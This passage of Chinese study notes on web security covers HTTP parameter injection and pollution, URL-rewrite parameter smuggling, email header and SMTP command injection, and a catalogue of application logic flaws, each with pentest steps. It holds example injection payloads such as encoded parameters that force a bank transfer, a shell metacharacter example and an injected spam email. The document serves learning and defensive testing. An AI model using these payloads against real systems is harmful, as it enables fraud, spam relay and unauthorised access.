<h3 id="HTTP-参数注入"><a href="#HTTP-参数注入" class="headerlink" title="HTTP 参数注入"></a>HTTP 参数注入</h3><p>示例：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 客户端发起的 HTTP 请求</span><br><span class="hljs-attribute">POST</span> /bank/<span class="hljs-number">48</span>/Default.aspx HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Host</span>: mdsec.net<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">65</span><br><br><span class="hljs-attribute">FromAccount</span>=<span class="hljs-number">123</span>&amp;Amount=<span class="hljs-number">1000</span>&amp;ToAccount=<span class="hljs-number">456</span>&amp;Summit=Submit<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 应用程序基于客户端的输入，生成新的后端 HTTP 请求</span><br><span class="hljs-attribute">POST</span> /doTransfer.asp HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Host</span>: mdsec-mgr.ini.mdsec.net<br><span class="hljs-attribute">Content</span>-Lenght: <span class="hljs-number">44</span><br><span class="hljs-attribute">fromacc</span>=<span class="hljs-number">123</span>&amp;Amount=<span class="hljs-number">1000</span>&amp;toacc=<span class="hljs-number">456</span>&amp;clearedfunds=false<br></code></pre></td></tr></table></figure>

<p>由于应用程序检查后，发现账户上的余额不足，因此在发起的请求中添加了 clearedfunds&#x3D;false 键值对来避免触发实际的转账，因此，攻击有可能伪造参数来触发转账</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 客户端发起的 HTTP 修改为</span><br><span class="hljs-comment"># 此处故意将请求参数中的等号 = 用 %3d 来表示，连接符 &amp; 用 %26 表示，以利用应用程序将其解码为正确的符号）: </span><br><span class="hljs-attribute">FromAccount</span>=<span class="hljs-number">123</span>&amp;Amount=<span class="hljs-number">1000</span>&amp;ToAccount=<span class="hljs-number">456</span>%<span class="hljs-number">26</span>clearedfunds%<span class="hljs-number">3</span>dtrue&amp;Summit=Submit<br></code></pre></td></tr></table></figure>

<p>如果应用程序没有将用户的请求进行过滤，则其向其他组件发起的请求将变成如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 应用程序未过滤用户输入时发起的请求变成如下：</span><br><span class="hljs-attribute">fromacc</span>=<span class="hljs-number">123</span>&amp;Amount=<span class="hljs-number">1000</span>&amp;toacc=<span class="hljs-number">456</span>&amp;clearedfunds=true<br></code></pre></td></tr></table></figure>

<blockquote>
<p>使用 HTTP 参数注入与 SOAP 注入的一个区别是，如果参数格式不对，SOAP 因为使用了 XML，会报错，从而为攻击者提供有用的反馈信息；但 HTTP 参数如果出现错误，一般不会报错，因此这会带来攻击上的困难，攻击者很难通过随机的方式猜测到参数是什么，但是如果应用程序使用的第三方组件的代码可以被查到，则攻击者可以通过查看这些代码的文档，找到其参数格式信息；</p>
</blockquote>
<h4 id="HTTP-参数污染"><a href="#HTTP-参数污染" class="headerlink" title="HTTP 参数污染"></a>HTTP 参数污染</h4><p>如果客户端发起的请求中，包括多个同名的键值对，HTTP 报文解析器会如何处理？不同的解析器会有不同的处理方式，常见的有以下几种：</p>
<ul>
<li>使用第一个键值对实例；</li>
<li>使用最后一个实例；</li>
<li>将同名键值对组成数组；</li>
<li>不处理，串联多个参数值，添加某种分隔符；</li>
</ul>
<p>如果应用程序使用最后一个或者第一个同名实例，都有可能让攻击者攻击成功；</p>
<h4 id="攻击-URL-重写转换"><a href="#攻击-URL-重写转换" class="headerlink" title="攻击 URL 重写转换"></a>攻击 URL 重写转换</h4><p>许多服务器程序会将受到的客户端请求的 URL 路径部分进行重写，例如处理 REST 风格的参数，定制路由函数等；如果在重写的过程中，没有进行过滤检查，则攻击者可以利用访漏洞，进行参数污染；</p>
<p>示例：开发者在 Apache 中配置 mod_rewrite 规则用于处理可公共访问的用户资源</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%&#123;THE_REQUEST&#125;</span> ^[A-Z]&#123;<span class="hljs-number">3</span>, <span class="hljs-number">9</span>&#125;\ /pub/user/[^\&amp;]*\TP/<br><span class="hljs-attribute">RewriteRule</span> ^pub/user/([^/\.] +)$ /inc/user_mgr.php?mode=view&amp;name=$<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>该规则提取用户请求中的文件名，做为值，与 name 字段组成参数，传递给 user_mgr.php 页面进行处理</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 例如接受如下请求</span><br><span class="hljs-keyword">/pub/</span>user/marcus<br><br><span class="hljs-meta"># 之后转换为</span><br><span class="hljs-keyword">/inc/</span>user_mgr.php?<span class="hljs-attr">mode</span><span class="hljs-operator">=</span>view<span class="hljs-variable">&amp;name</span>=marcus<br></code></pre></td></tr></table></figure>

<p>攻击者可在原始请求中注入另外 mode 来改变应用程序的行为</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 攻击者注入额外的参数值</span><br><span class="hljs-keyword">/pub/</span>user/marcus%<span class="hljs-number">26</span>mode%<span class="hljs-number">30</span>edit<br><br><span class="hljs-meta"># Apache 服务器转换后</span><br><span class="hljs-keyword">/inc/</span>user_mgr.php?<span class="hljs-attr">mode</span><span class="hljs-operator">=</span>view<span class="hljs-variable">&amp;name</span>=marcus<span class="hljs-variable">&amp;mode</span>=edit<br></code></pre></td></tr></table></figure>

<p>渗透测试步骤</p>
<ol>
<li>轮流对每个请求参数进行测试，使用各种语法添加一个新注入的参数<ol>
<li>%26foo%3dbar，URL 编码的 &amp;foo&#x3D;bar</li>
<li>%3bfoo%3dbar，URL 编码的 ;foo&#x3D;bar</li>
<li>%2526foo%253dbar，双重 URL 编码的 &amp;foo&#x3D;bar（将 % 百分比也做了一重编码）</li>
</ol>
</li>
<li>确定任何修改后，不会改变应用程序行为的参数实例；</li>
<li>尝试在请求的不同位置注入一个已知的参数，看这样做是否会覆盖或修改现有的参数；</li>
<li>如果这样做会将旧值替换成新值，尝试是否可以通过注入一个由后端服务器读取的值，来避开任何前面确认机制；</li>
<li>用其他参数名称替换注入的已知参数（可通过解析应用程序的功能进行猜测和寻找线索）；</li>
<li>测试应用程序是否允许在请求中多次提交同一个参数，在参数的前后，以及请求的不同位置提交多余的值，例如查询字符串、cookie 和消息主体中；</li>
</ol>
<h2 id="注入电子邮件"><a href="#注入电子邮件" class="headerlink" title="注入电子邮件"></a>注入电子邮件</h2><p>有些应用程序提供收集用户反馈的功能，例如关于产品的建议或者BUG，有些时候这类功能在后端使用电子邮件的形式来实现。即用户提交的输入，到了后端会发送给 SMTP 服务器，然后按照某种设定好的模板，发送给相关的人员；如果应用程序没有对用户的输入进行仔细净化的话，攻击者就有机会在提交的内容中，注入一些 SMTP 命令，从而控制 SMTP 服务器，实现一些非法行为，例如让 SMTP 服务器帮助攻击者发送垃圾邮件等；</p>
<h3 id="操纵电子邮件头部"><a href="#操纵电子邮件头部" class="headerlink" title="操纵电子邮件头部"></a>操纵电子邮件头部</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082331.png" srcset="/img/loading.gif" lazyload></p>
<p>应用程序允许用户提交反馈的界面，用户可以在该界面中输入自己的邮件地址；之后，Web应用程序如 PHP 将调用 mail 函数，生成电子邮件，例如：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">To</span>: admin<span class="hljs-symbol">@wahh</span>-app.com<br>From: marcus<span class="hljs-symbol">@wahh</span>-mail.com<br>Subject: Site problem<br><br>xxxxxxxxx<br></code></pre></td></tr></table></figure>

<p>如果应用程序的后端没有对用户输入的地址进行过滤，则攻击者可以在地址中注入有效的 SMTP 命令字符串，让 SMTP 将服务发送给其指定的任意收件人</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082743.png" srcset="/img/loading.gif" lazyload></p>
<p>PHP mail 命令将生成如下内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">To</span>: admin<span class="hljs-variable">@wahh</span><span class="hljs-operator">-</span>app.com<br><span class="hljs-keyword">From</span>: marcus<span class="hljs-variable">@wahh</span><span class="hljs-operator">-</span>mail.com<br>Bcc: <span class="hljs-keyword">all</span><span class="hljs-variable">@wahh</span><span class="hljs-operator">-</span>othercompany.com<br>Subject: Site problem<br><br>xxxxxxxxx<br></code></pre></td></tr></table></figure>

<h3 id="SMTP-命令注入"><a href="#SMTP-命令注入" class="headerlink" title="SMTP 命令注入"></a>SMTP 命令注入</h3><p>某些情况下，Web 应用程序会与 SMTP 服务器建立会话，传输数据内容；</p>
<p>用户端发起的请求，提交关于站点的反馈</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">feedback.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>wahh-app.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><br><span class="language-sas"><span class="hljs-keyword">From</span>=daf@wahh-mail.com<span class="hljs-variable">&amp;Subject</span>=Site+feedback<span class="hljs-variable">&amp;Message</span>=foo</span><br></code></pre></td></tr></table></figure>

<p>Web 应用程序与 SMTP 服务器建立的会话往来示例：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">MAIL FROM: daf<span class="hljs-symbol">@wahh</span>-mail.com<br>RCPT <span class="hljs-keyword">TO</span>: feedback<span class="hljs-symbol">@wahh</span>-app.com<br>DATA  <span class="hljs-meta"># 此处 SMTP 客户端发出 DATA 命令，应用程序接下来将开始发送消息的内容，包括消息头和消息体，并以点号表示结束</span><br>From: daf<span class="hljs-symbol">@wahh</span>-mail.com<br><span class="hljs-keyword">To</span>: feedback<span class="hljs-symbol">@wahh</span>-app.com<br>Subject: Site feedback<br>foo<br>. <span class="hljs-meta"># 用单独一行的点等号表示消息的结束</span><br></code></pre></td></tr></table></figure>

<p>如果应用程序没有对用户输入进行过滤的话，则攻击者可以利用这个漏洞，在消息中注入有效的 SMTP 命令，从而实现对  SMTP 服务器的控制；注入示例如下（在 subject 字段进行注入）：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112084106.png" srcset="/img/loading.gif" lazyload></p>
<p>之后 Web 应用程序建立如下 SMTP 会话，生成了两个电子邮件，其中第二段由攻击者完全控制：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs autoit">MAIL FROM: daf<span class="hljs-symbol">@wahh</span>-mail.com<br>RCPT <span class="hljs-keyword">TO</span>: feedback<span class="hljs-symbol">@wahh</span>-app.com<br>DATA <br>From: daf<span class="hljs-symbol">@wahh</span>-mail.com<br><span class="hljs-keyword">To</span>: feedback<span class="hljs-symbol">@wahh</span>-app.com<br>Subject: Site feedback<br>foo<br>.<br>MAIL FROM: mail<span class="hljs-symbol">@wahh</span>-viagra.com<br>RCPT <span class="hljs-keyword">TO</span>: john<span class="hljs-symbol">@wahh</span>-mail.com<br>DATA<br>From: mail<span class="hljs-symbol">@wahh</span>-viagra.com<br><span class="hljs-keyword">To</span>: john<span class="hljs-symbol">@wahh</span>-mail.com<br>Subject: Cheap V1AGR4<br>Blah<br>.<br>foo<br>.<br></code></pre></td></tr></table></figure>

<h3 id="查找-SMTP-漏洞"><a href="#查找-SMTP-漏洞" class="headerlink" title="查找 SMTP 漏洞"></a>查找 SMTP 漏洞</h3><p>在解析应用程序的功能时，留意其中那些与电子邮件相关的功能，测试这些功能涉及的每一个参数，甚至那些可能与生成的消息无关的参数；</p>
<p>除了每一种攻击方式外，还注意各使用 Windows 和 Unix 的换行符来测试一遍，因为有时候并不知道后台使用的是哪一种操作系统；</p>
<p>渗透测试步骤</p>
<ul>
<li>轮流提交以下的测试字符串作为每一个参数，用于在相关位置插入电子邮件地址；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112085804.png" srcset="/img/loading.gif" lazyload></li>
<li>留意应用程序返回的错误消息，根据错误消息，看是否跟电子邮件功能相关，如果是的话，考虑对提交的注入内容进行相应的调整，以利用漏洞；</li>
<li>监控受控的邮箱，看是否收到邮件；</li>
<li>仔细检查发出的 HTTP 请求，看是否存在与后端的电子邮件相关的线索，例如是否包含隐藏或禁用字段，用于指定电子邮件收件人等；</li>
</ul>
<blockquote>
<p>发送电子邮件功能经常被视为外围功能，而非核心功能，因此经常没有被重视，并采取足够的安全保障；电子邮件有时需要调用一些不常用的第三方组件，应用程序经常直接调用操作系统的命令来执行它们，因此还经常隐藏着 OS 命令的注入漏洞，应对其进行仔细的检查；</p>
</blockquote>
<h3 id="防止-SMTP-注入"><a href="#防止-SMTP-注入" class="headerlink" title="防止 SMTP 注入"></a>防止 SMTP 注入</h3><p>防止 SMTP 注入的办法用户提交的任何数据进行严格的检查</p>
<ul>
<li>根据一个适当的正则表达式检查电子邮件地址，例如拒绝所有的换行符；</li>
<li>消息主题不得包含任何的换行符，并应实施适当的长度限制；</li>
<li>如果消息内容会被 SMTP 会话直接使用，则应在消息内容中禁止使用只有一个点字符的消息行；</li>
</ul>
<h2 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h2><p>一般来说，实施有效攻击的关键在于从直觉上了解漏洞的位置，以及如何对其加以利用；获得这种直觉的方式在于实践，在现实的应用程序中，演练前面提到的各种攻击技巧，并观察应用程序如何对攻击作出反应，从而建立对应用程序行为与漏洞有关联的直觉。</p>
<h1 id="11-攻击应用程序逻辑"><a href="#11-攻击应用程序逻辑" class="headerlink" title="11. 攻击应用程序逻辑"></a>11. 攻击应用程序逻辑</h1><p>计算机不外乎做两种计算，一种是逻辑计算，一种是算术计算；所有复杂的应用程序功能，最后都将拆解成由简单的逻辑和算术计算来构成；人们常常只关注那些常见的漏洞，例如 SQL 注入或者跨站点脚本，却往往忽略了程序中的逻辑漏洞其实它们无处不在，尤其是当应用程序是由多名水平参差不齐的开发者来共同完成的时候；这些漏洞经常是与应用程序功能紧密相关和唯一的，它们很隐蔽，无法被常规的漏洞扫描器所发现；</p>
<h2 id="逻辑缺陷的本质"><a href="#逻辑缺陷的本质" class="headerlink" title="逻辑缺陷的本质"></a>逻辑缺陷的本质</h2><p>逻辑缺陷本质上来源于开发者的设计缺陷，由于开发者在设计过程，做出某种错误的假设，导致应用程序在某些条件下，将出现预期外的行为；只要开发者的水平没有显著提高，这些漏洞缺陷将是不可避免和大量存在的。</p>
<h2 id="现实中的逻辑缺陷"><a href="#现实中的逻辑缺陷" class="headerlink" title="现实中的逻辑缺陷"></a>现实中的逻辑缺陷</h2><h3 id="例子1：加密算法提示漏洞"><a href="#例子1：加密算法提示漏洞" class="headerlink" title="例子1：加密算法提示漏洞"></a>例子1：加密算法提示漏洞</h3><p>有些应用程序为了减少用户登录的次数，会将用户信息加密成一个长久有效的 cookie 值，存储在浏览器中；正常情况下，攻击者是无法破解该加密后的 cookie 值的，但是有些开发者还会将该加密算法应用于其他 cookie 字段，例如屏幕上显示的用户昵称；但好死不死的是，用户昵称是可以由用户自己指定的；因此，攻击者通过指定不同的用户昵称，就可以得到加密后的值；此时，攻击者可以将自己浏览器上加密后的 cookie 值做为昵称，经过加密算法解密后，得出原始值的格式；然后再按照相同的格式，尝试将其中的用户名替换为管理员的用户名，然后设置为昵称，这样就可以得到加密后的新 cookie 值；使用该 cookie 值，很可能就可以实现管理员登录；</p>
<h4 id="渗透测试步骤-48"><a href="#渗透测试步骤-48" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>漏洞场景：使用令牌的程序</p>
<ul>
<li>在应用程序中找出使用加密值的位置（大多数情况下是使用散列值）；<ul>
<li>查找应用程序中，任何对用户提交的值进行加密或者解密的位置；</li>
<li>如发现应用程序使用某个加密值，尝试替代该加密值，然后观察程序是否会提示替代后的结果或报错；</li>
<li>如有结果或报销，尝试利用该信息；</li>
</ul>
</li>
<li>查找应用程序中，当用户提交加密值，程序会在响应中显示对应的解密值的位置<ul>
<li>如有，说明提示漏洞存在；</li>
<li>确认这种漏洞是否会导致敏感令牌泄露；</li>
</ul>
</li>
<li>查找应用程序中，当用户提交明文值，程序会在响应中显示对应的加密值的位置；<ul>
<li>如有，说明提示漏洞可能存在；</li>
<li>尝试对该漏洞加以利用，例如通过指定任意值，让程序进行处理，得到有用的信息；</li>
</ul>
</li>
</ul>
<h3 id="例子2：密码修改漏洞"><a href="#例子2：密码修改漏洞" class="headerlink" title="例子2：密码修改漏洞"></a>例子2：密码修改漏洞</h3><p>有些程序为用户提供修改密码的功能，该功能要求客户端提交用户名、现有密码、新密码等字段组成；同时，该功能同时也面向管理员，即管理员也可以使用该功能修改自己的密码；两种角色的区别在于管理员不需要提供现有密码，后端的代码通过判断是否包含现有密码，来区别修改密码的用户是否为管理员角色；</p>
<blockquote>
<p>这个漏洞的脑洞太大了，简直是致命的；攻击者可以利用该漏洞获得管理员的权限，并修改任意用户的现有密码；</p>
</blockquote>
<h4 id="渗透测试步骤-49"><a href="#渗透测试步骤-49" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>在探查逻辑缺陷时，尝试轮流删除关键功能的请求中提交的每一个参数，例如 cookie、查询字符串、POST 参数等；<ul>
<li>删除参数名称的时候，同时也删除参数值，而不是将参数值设置为空字符串；</li>
<li>一次仅攻击一个参数，确保可以覆盖后端代码逻辑中的每一个分支；</li>
<li>如果该功能属于多阶段过程，务必要完成整个过程，因为很可能后面步骤会使用前面步骤中提交的并保存在会话中的数据；</li>
</ul>
</li>
</ul>
<h3 id="例子3：步骤控制漏洞"><a href="#例子3：步骤控制漏洞" class="headerlink" title="例子3：步骤控制漏洞"></a>例子3：步骤控制漏洞</h3><p>在多步骤的功能中，很多开发者想当然的认为用户一定会按照界面上显示的内容，依次完成每一个环节，但事实上攻击者并不会这么做；攻击者会以任意顺序提交请求，从而绕过一些中间步骤，达到最终结果；</p>
<h4 id="渗透测试步骤-50"><a href="#渗透测试步骤-50" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果某个多阶段功能需要按预定顺序提交一系列请求，尝试按其他顺序提交请求；<ul>
<li>尝试完全忽略某些中间阶段；</li>
<li>多次访问同一个阶段；</li>
<li>推后访问前一个阶段；</li>
</ul>
</li>
<li>了解多阶段功能的阶段控制办法；<ul>
<li>例如多阶段功能的不同阶段的请求，可能都是访问的同一个 URL，并在参数中指定阶段序号参数或者阶段名称；</li>
</ul>
</li>
<li>猜测开发者做出的错误假设，判断主要受攻击面的点；<ul>
<li>设法找出如何违反这些假设的方法，从而让程序出现反常行为；</li>
</ul>
</li>
<li>在不按顺序访问程序时，如果程序出现异常行为，例如某个变量值和状态值异常；则此时很可能存在可以利用的有用错误信息，可用来进一步推断程序的内部机制，以便对攻击方法进行优化；</li>
</ul>
<h3 id="例子4：额外字段漏洞"><a href="#例子4：额外字段漏洞" class="headerlink" title="例子4：额外字段漏洞"></a>例子4：额外字段漏洞</h3><p>开发者经常假设用户只会提交页面表单所指定的字段，但事实上攻击者可以提交额外的字段，来影响程序的行为；</p>
<blockquote>
<p>因此，绝对不能读取客户端提交的整个请求对象，而是按需读取；如果需要读取很多字段，可以编写一个函数进行净化处理，返回一个按需读取后生成的新对象；</p>
</blockquote>
<p>在多阶段的功能中，开发者经常在后面阶段中假设其收到的值，已经在前面的阶段中经过了严格的检查，但事实上，由于攻击可以直接访问任意一个阶段，这将导致后面阶段收到的值，其实是攻击者自行定义好的，根本没有经过前面阶段的代码的任何检查；</p>
<h4 id="渗透测试步骤-51"><a href="#渗透测试步骤-51" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果存在多阶段的功能，则应提取某个阶段提交的参数，然后尝试在另外一阶段提交该参数；<ul>
<li>如果程序的状态随参数的变化出现更新，则应进一步探索这种漏洞的衍生效果，看是否可以利用它来实施恶意的操作；</li>
</ul>
</li>
<li>某个功能可能使用不同的参数来区分用户，来产生不同的行为；观察不同角色的用户，就同一项功能，是否在提交的参数上有什么不同；<ul>
<li>如果有，就尝试以 B 用户的身份提交 A 用户的独有参数，观察该请求的衍生效果，猜测是否存在可利用的漏洞；</li>
</ul>
</li>
</ul>
<h3 id="例子5：会话身份漏洞"><a href="#例子5：会话身份漏洞" class="headerlink" title="例子5：会话身份漏洞"></a>例子5：会话身份漏洞</h3><p>开发者经常将用户信息保存在会话中，如果程序中存在某个功能（例如注册），允许更改会话中用户的的核心信息，则有可能存在伪造身份的漏洞，即攻击者先注册一个有效的会话，然后利用该功能，更改其会话中的身份信息，并跳转到程序中的其他页面，此时很可能能够扮演其他身份的用户；</p>
<h4 id="渗透测试步骤-52"><a href="#渗透测试步骤-52" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序存在水平权限或垂直权限隔离，则设法确定会话中存储了哪些与用户身份相关的信息；</li>
<li>浏览某个功能区域，然后转换到另一个完全无关的区域，检查积聚的状态，是否会对应用程序的行为造成影响；</li>
</ul>
<h3 id="例子6：交易限额漏洞"><a href="#例子6：交易限额漏洞" class="headerlink" title="例子6：交易限额漏洞"></a>例子6：交易限额漏洞</h3><p>假设某个程序有权在两个受控的账户之间进行转账（例如银行账户），并设置转账限额，超过限额后需要审批；限额判断的代码容易犯一个错误，即忘记处理输入值为负数的情况，此时有可能导致反向转账成功；</p>
<h4 id="渗透测试步骤-53"><a href="#渗透测试步骤-53" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>规避交易限制的第一步，是先确认当前的输入控制接受哪些字符，不接受哪些字符</p>
<ul>
<li>试着输入负值，观察程序是否能够正常处理；</li>
<li>如果能够正常处理，此时有可能需要为利用漏洞创造条件，例如确保转出账户上有足够的金额；（想起了虚拟平台被攻击的案例）；</li>
</ul>
<h3 id="例子7：折扣计算漏洞"><a href="#例子7：折扣计算漏洞" class="headerlink" title="例子7：折扣计算漏洞"></a>例子7：折扣计算漏洞</h3><p>很多电商程序会提供折扣计算功能，即购物金额超过一定金额时，消费者能够享受到更大的折扣；开发者有时会忘记处理逆向场景，即当消费者将商品从购物车移走时，需要重新计算折扣，导致消费者可以利用这个漏洞，先添加在大量商品，触发折扣条件，然后再移除不需要的商品；</p>
<h4 id="渗透测试步骤-54"><a href="#渗透测试步骤-54" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>检查应用程序中，是否存在价格或其他敏感价值的东西，需要根据用户输入的数据进行调整的情况；</li>
<li>如果有，了解程序使用的算法和调整的逻辑；</li>
<li>检查这些调整是一次性的行为，还是非一次性行为；</li>
<li>发挥想象力，想出一种操纵办法，让调整行为与开发者的预设相矛盾；</li>
</ul>
<h3 id="例子8：转义符漏洞"><a href="#例子8：转义符漏洞" class="headerlink" title="例子8：转义符漏洞"></a>例子8：转义符漏洞</h3><p>为了避免注入漏洞，开发者会对敏感字符进行限制，但是开发者经常只控制一层（没有递归），导致攻击者可能会使用两层甚至多层转义的办法，来绕过开发者的限制；</p>
<p>例如：开发者会设置敏感字符列表，然后对列表中的字符添加转义符；当用户提交 foo;ls 时，开发者会对其中的敏感字符分号添加转义符，最终变成 foo;ls</p>
<p>但是，攻击者会尝试提交 foo;ls，这样一来，按照开发者的处理逻辑，最终字符串变成了 “foo\;ls”，转义符本身被转义，shelll 可以接受以上命令并执行，攻击者的注入意图得以实现；</p>
<h4 id="渗透测试步骤-55"><a href="#渗透测试步骤-55" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>在探查程序是否存在注入缺陷时，尝试在受控制的数据中，插入相关元字符后，再在每个元字符前插入一个反斜线，对元字符符进行转义，观察程序程序的反应；</p>
<blockquote>
<p>一些处理跨站点脚本攻击的代码中，也经常使用转义符来净化用户提交的数据，但是它们经常忘了对转义符本身进行处理；</p>
</blockquote>
<h3 id="例子9：过滤截短漏洞"><a href="#例子9：过滤截短漏洞" class="headerlink" title="例子9：过滤截短漏洞"></a>例子9：过滤截短漏洞</h3><p>开发者在防范 SQL 注入漏洞时，会使用过滤和长度限制两种方法；一种常见的过滤方法是对引号进行配对，这样就可以避免攻击者使用引号；在做长度限制时，有些开发者不是直接报错，而是对输入进行截短；攻击者此时可以巧妙的利用截短功能，来使用引号配对功能失效，从而能够实施注入攻击；</p>
<blockquote>
<p>一开始并不需要知道开发者实施的长度限制是多少，攻击者只需要轮流提交奇数个和偶数个由引号组成的长字符串，并观察程序是否报错，即可确认长度限制为多少；</p>
</blockquote>
<h4 id="渗透测试步骤-56"><a href="#渗透测试步骤-56" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>记下应用程序中修改用户输入的所有位置（例如截短、删除数据、编码、解码等）；对于观察到每一个位置，检查是否可以人为构造恶意字符串；</p>
<ul>
<li>如果输入数据已经被过滤了一次（非递归），确认是否可以提交一个“补偿”过滤的字符串；例如：假设程序会过滤着关键字 SELECT，则尝试提交 SELECTSELECT，看程序是否会在过滤后，留下一个 SELECT；</li>
<li>如果程序中存在多步骤的行为，则可以检查是否可以利用后面的步骤，来破坏上一个步骤的过滤结果；</li>
</ul>
<h3 id="例子10：搜索功能漏洞"><a href="#例子10：搜索功能漏洞" class="headerlink" title="例子10：搜索功能漏洞"></a>例子10：搜索功能漏洞</h3><p>有些应用程序提供全局搜索功能，即搜索所有文档，但有时这些文档只是部分公开，攻击者可以利用搜索功能，反复提交各种关键字组合，从而推断出文档的内容，获取一些敏感数据；</p>
<h3 id="例子11：调试信息漏洞"><a href="#例子11：调试信息漏洞" class="headerlink" title="例子11：调试信息漏洞"></a>例子11：调试信息漏洞</h3><p>当一个新产品上线时，前期不可避免会存在大量功能上的缺陷，开发者为了方便调试，经常会让程序返回一些与错误相关的数据，有时候这些数据是很敏感的，例如用户的令牌、用户名、请求参数等；开发者有时会将这些数据保存在某个全局变量，然后使用某个 URL 指向它，然后通过重定向返回错误提示数据；</p>
<p>如果访问错误提示数据的 URL 是固定的或者可以预测的，那些攻击者可以通过反复访问该 URL，来获取一段时间内所有的错误提示，从而获取到一大堆用户敏感数据，甚至当管理员访问出错时，就可以直接得到管理员的敏感数据，从而攻陷整个程序；</p>
<h4 id="渗透测试步骤-57"><a href="#渗透测试步骤-57" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先罗列出程序中所有可能出现的反常事件和条件（以便创造条件触发它们），以及使用非常规的方式返回有用的用户令牌的情况（例如返回调试信息）；</li>
<li>同时使用两名用户的账户登录并使用应用程序，使用一名用户系统性的触发每个条件，观察另外一个用户是否会受到影响；</li>
</ul>
<h3 id="例子12：全局变量漏洞"><a href="#例子12：全局变量漏洞" class="headerlink" title="例子12：全局变量漏洞"></a>例子12：全局变量漏洞</h3><p>经验不足的开发者有时会将某个用户信息保存在全局变量中，以供另外一个位置的函数能否进行访问；当用户数量足够多时，有可能同时有两名用户触发保存该变量的条件，此时会形成竞态条件，从而使得一名用户有机会访问另外一名用户的信息；</p>
<h4 id="渗透测试步骤-58"><a href="#渗透测试步骤-58" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>这种漏洞很难发现，因为它需要比较极端的条件，同时错误不容易复现</p>
<ul>
<li>针对关键功能进行测试，例如登录机制，密码修改功能、转账功能等；</li>
<li>该关键功能要求用户提交一个或多个请求；</li>
<li>找出确认用户请求提交成功的判断方法，即用户请求的数据，能够被查看核对；</li>
<li>使用多台机器，从不同的网络位置发起请求，反复执行请求操作，检查每项操作是否达到预期的结果；</li>
